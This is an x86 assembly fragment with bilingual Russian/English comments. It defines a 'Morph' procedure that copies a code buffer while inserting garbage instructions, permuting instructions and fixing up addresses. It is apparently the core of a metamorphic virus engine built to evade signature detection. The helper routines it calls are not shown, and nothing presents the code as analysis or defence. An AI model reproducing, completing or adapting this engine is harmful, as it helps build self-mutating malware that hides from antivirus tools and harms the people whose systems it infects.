; Собственно сама процедура-морфер
; Morpher

Morph	proc	; ESi - SRC, EDi - DST, Returns: ECX - new size
	push	edi
xMorph:	cmp	esi,[MaxMorph][ebp]			; До конца дошли ?
	ja	AllDone					; Some data more ?
	
	Call	CheckBlock				; Code ?
	jc	SkipByte

	Call	DoGarble

	Call	CheckVariable
	Call	CheckAddr
	Call	CheckDataAddr
	Call	CheckTblAddr

	Call	GetSize32			; Код. Размер комманды

	push	eax
	Call    Mutate				; Permutate instruction
	pop	ecx				; (if possible)
	jnc     AddGarb				; Permutated ?
rep	movsb					; Just copy
AddGarb:
;	Call	DoGarble
	mov	[GarbLvl][ebp],0
	jmp	xMorph
SkipByte:
	Call	CheckVariable
	Call	CheckAddr
	Call	CheckDataAddr
	Call	CheckTblAddr
	movsb					; Данные. Копируем байт
						; Data. Copy byte
	jmp	xMorph
AllDone:
	pop	eax
	sub	edi,eax				; Рассчитаем новый размер
	xchg	edi,ecx
	ret
Morph	endp
